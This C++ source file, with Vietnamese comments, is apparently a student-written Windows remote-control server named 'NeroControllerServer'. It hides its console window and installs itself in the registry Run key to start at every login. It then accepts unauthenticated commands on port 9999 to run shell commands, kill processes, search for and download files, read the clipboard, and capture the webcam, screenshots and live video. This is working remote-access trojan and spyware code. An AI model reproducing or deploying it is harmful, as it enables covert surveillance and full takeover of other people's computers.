/* Author : Necrosid3 - Duong Nguyen Khanh - UET_VNU */
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "commands.h"
#include "utils.h"
#include "file_manager.h"

// Ép chương trình chạy dưới nền Windows, đéo bao giờ chớp cửa sổ đen CMD lên
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

// Hàm tống file exe vào Registry để khởi động cùng Windows
void auto_start_registry() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;

    // res: hứng kết quả mở Registry
    long res = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if (res == ERROR_SUCCESS) {
        // ans: đường dẫn file .exe bọc trong ngoặc kép
        std::string ans = std::string("\"") + path + "\"";
        RegSetValueExA(hKey, "NeroControllerServer", 0, REG_SZ, (BYTE*)ans.c_str(), ans.length() + 1);
        RegCloseKey(hKey);
    }
}

void handle_client(SOCKET client_socket) {
    char buffer[4096];
    int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);

    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        std::string command(buffer);
        command.erase(command.find_last_not_of(" \n\r\t") + 1);

        if (command.find(Commands::FILE_SEND) == 0) {
            handle_file_receive(command, client_socket);
        } else if (command == Commands::GET_STATS) {
            std::string ans = Utils::get_system_stats() + "\n";
            send(client_socket, ans.c_str(), ans.length(), 0);
        } else if (command == Commands::WEBCAM) {
            std::string base64_img = Utils::capture_webcam();
            if (!base64_img.empty()) {
                std::string ans = "WEBCAM_DATA_" + base64_img + "\n";
                send(client_socket, ans.c_str(), ans.length(), 0);
            } else {
                std::string ans = "ERROR_CAM\n";
                send(client_socket, ans.c_str(), ans.length(), 0);
            }
        } else if (command == Commands::SCREENSHOT) {
            std::string base64_img = Utils::capture_screenshot();
            if (!base64_img.empty()) {
                std::string ans = "WEBCAM_DATA_" + base64_img + "\n";
                send(client_socket, ans.c_str(), ans.length(), 0);
            } else {
                std::string ans = "ERROR_CAM\n";
                send(client_socket, ans.c_str(), ans.length(), 0);
            }
        } else if (command.find(Commands::CMD_SHELL) == 0) {
            std::string cmd = command.substr(Commands::CMD_SHELL.length());
            std::string ans = Utils::execute_shell(cmd) + "\n";
            send(client_socket, ans.c_str(), ans.length(), 0);
        } else if (command.find(Commands::CMD_KILL) == 0) {
            std::string process_name = command.substr(Commands::CMD_KILL.length());
            std::string ans = Utils::kill_process(process_name) + "\n";
            send(client_socket, ans.c_str(), ans.length(), 0);
        } else if (command.find(Commands::CMD_SEARCH) == 0) {
            std::string query = command.substr(Commands::CMD_SEARCH.length());
            std::string ans = Utils::search_file(query);
            send(client_socket, ans.c_str(), ans.length(), 0);
        } else if (command.find(Commands::FILE_DOWNLOAD) == 0) {
            std::string path = command.substr(Commands::FILE_DOWNLOAD.length());
            std::ifstream file(path, std::ios::binary | std::ios::ate);
            if (file.is_open()) {
                std::streamsize size = file.tellg();
                file.seekg(0, std::ios::beg);
                if (size > 0) {
                    std::string ans = "FILE_BIN_" + std::to_string(size) + "\n";
                    send(client_socket, ans.c_str(), (int)ans.length(), 0);
                    char file_buf[8192];
                    while (file.read(file_buf, sizeof(file_buf)) || file.gcount() > 0) {
                        int bytes_to_send = (int)file.gcount();
                        int total_sent = 0;
                        while (total_sent < bytes_to_send) {
                            int sent = send(client_socket, file_buf + total_sent, bytes_to_send - total_sent, 0);
                            if (sent <= 0) break;
                            total_sent += sent;
                        }
                        if (!file) break;
                    }
                    file.close();
                } else {
                    file.close();
                    send(client_socket, "ERROR_FILE_EMPTY\n", 17, 0);
                }
            } else {
                send(client_socket, "ERROR_FILE_NOT_FOUND\n", 21, 0);
            }
        } else if (command.find(Commands::VOICE_CMD) == 0) {
            std::string res = command.substr(Commands::VOICE_CMD.length());
            std::string ans = Utils::handle_voice_command(res) + "\n";
            send(client_socket, ans.c_str(), ans.length(), 0);
        } else if (command == Commands::GET_CLIPBOARD) {
            std::string ans = Utils::get_clipboard_text() + "\n";
            send(client_socket, ans.c_str(), ans.length(), 0);
        } else if (command.find(Commands::LIVE_STREAM) == 0) {
            std::string res = command.substr(Commands::LIVE_STREAM.length());
            Utils::start_live_stream(res);
            std::string ans = "STREAM_STARTED\n";
            send(client_socket, ans.c_str(), ans.length(), 0);
        } else {
            Utils::execute_command(command);
        }
    }
    closesocket(client_socket);
}

int main() {
    // 1. Tự động gắn vào Registry, khởi động cùng win
    auto_start_registry();

    // 2. Dọn port cũ nếu có
    Utils::clear_port_9999();

    // 3. Khởi tạo GDI+, WinSock...
    Utils::init();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    SOCKET server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(9999);

    if (bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    while (true) {
        SOCKET client_socket = accept(server_socket, nullptr, nullptr);
        if (client_socket != INVALID_SOCKET) {
            std::thread(handle_client, client_socket).detach();
        }
    }

    Utils::shutdown_gdiplus();
    closesocket(server_socket);
    WSACleanup();
    return 0;
}